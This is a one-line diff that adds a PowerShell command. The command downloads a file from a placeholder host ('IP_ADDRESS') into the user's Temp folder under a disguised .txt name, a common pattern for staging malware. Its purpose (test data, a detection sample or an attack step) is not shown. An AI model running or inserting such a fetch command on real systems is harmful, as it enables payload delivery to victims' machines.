@@ -1,0 +1,1 @@
+powershell -command "(new-object System.Net.WebClient).DownloadFile('http://IP_ADDRESS/index.html','%USERPROFILE%\AppData\Local\Temp\file2.txt')"
